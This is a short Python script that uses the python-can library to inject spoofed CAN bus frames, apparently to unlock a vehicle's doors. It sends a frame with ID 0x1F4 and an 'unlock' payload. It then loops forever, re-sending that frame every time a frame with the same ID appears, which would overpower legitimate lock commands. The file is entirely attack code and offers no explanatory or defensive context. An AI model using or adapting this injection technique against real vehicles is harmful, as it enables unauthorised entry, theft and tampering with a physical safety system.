#!/usr/bin/python3

import argparse
import can


DOORS_ID = 0x1F4
UNLOCK_DOORS_DATA = b"\x0f\x00\x00\x00\x00\x00\x00\x00"


def unlock_doors(interface: str) -> None:
    unlock = can.Message(
        arbitration_id=DOORS_ID, is_extended_id=False, data=UNLOCK_DOORS_DATA
    )

    with can.Bus(
        channel=interface,
        bustype="socketcan",
        can_filters=[{"can_id": DOORS_ID, "can_mask": 0xFFF, "extended": False}],
    ) as bus:
        bus.send(unlock)
        while True:
            bus.recv()
            bus.send(unlock)


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("interface")
    args = parser.parse_args()

    try:
        unlock_doors(args.interface)
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
